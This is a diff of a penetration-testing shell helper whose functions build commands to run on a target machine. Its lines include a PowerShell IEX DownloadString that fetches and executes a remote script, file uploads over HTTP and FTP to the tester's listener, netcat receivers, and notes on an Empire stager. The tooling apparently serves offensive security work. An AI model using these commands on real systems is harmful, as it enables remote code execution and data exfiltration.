@@ -37,8 +37,6 @@ nb-srv-file-download    select one of general commands to download a payload int
 nb-srv-empire-stager    command to download and execute empire stager in a target machine
 nb-srv-install          install dependencies
 
-
-
 Commands to upload a file to a server/listener on LINUX
 -------------------------------------------------------
 nb-srv-nc-tar           hosts a netcat server > tar file in current dir
@@ -142,8 +140,8 @@ nb-srv-uploadserver() {
   local path && __askvar path "FULL_PATH_TO_FILE"
 
   echo
-  __COMMAND1=IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
-  __COMMAND2=Invoke-FileUpload -Uri http://${__LHOST}:${__LPORT}/upload -File $path
+  __COMMAND1="IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')"
+  __COMMAND2="Invoke-FileUpload -Uri http://${__LHOST}:${__LPORT}/upload -File $path"
   echo "$__COMMAND2" | wl-copy
   echo "$__COMMAND1" | wl-copy
   __info "2 Commands to use on a target system copied to clipboard"
@@ -177,7 +175,7 @@ nb-srv-ftp-up() {
   local path && __askvar path "FULL_PATH_TO_FILE"
 
   echo
-  __COMMAND=(New-Object Net.WebClient).UploadFile('ftp://${__LHOST}/$filename', '$path')
+  __COMMAND="(New-Object Net.WebClient).UploadFile('ftp://${__LHOST}/$filename', '$path')"
   echo "$__COMMAND" | wl-copy
   __info "Command to use on a target system copied to clipboard"
 
@@ -294,10 +292,6 @@ nb-srv-nc-b64-web() {
     nc -lvnp ${__LPORT} -w 5 > incoming.b64 && echo '$(cat incoming.b64)' | base64 -d -w 0 > decoded.txt
     popd &> /dev/null
 }
-
-
-
-
 
 nb-srv-nc-tar() {
     nb-vars-set-lhost
